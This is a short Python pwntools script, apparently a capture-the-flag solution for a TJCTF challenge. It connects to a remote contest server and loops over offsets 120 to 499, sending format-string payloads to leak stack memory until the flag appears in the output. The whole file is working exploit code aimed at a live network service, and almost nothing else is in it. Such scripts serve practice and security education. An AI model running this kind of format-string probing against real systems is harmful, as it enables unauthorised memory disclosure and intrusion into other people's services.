#!/usr/bin/env python3

from pwn import *

# binary = context.binary = ELF('./chall')
# context.log_level = "error"

# if args.REMOTE:
#     p = remote('localhost', 1337)
# else:
#     p = process(binary.path)

# gdb.attach(p)

for i in range(120,500):
	# p = process('./chall', level='error')
	p = remote("tjc.tf", 31601)
	p.recv()
	payload = f"-{i}$lx"
	try:
		p.sendline(payload.encode())
		output = p.recv().decode()
		if "tjctf" in output:
			print(output)
			break
		p.close()
	except:
		p.close()

# p.sendline(payload)
# p.stream()
# p.interactive()

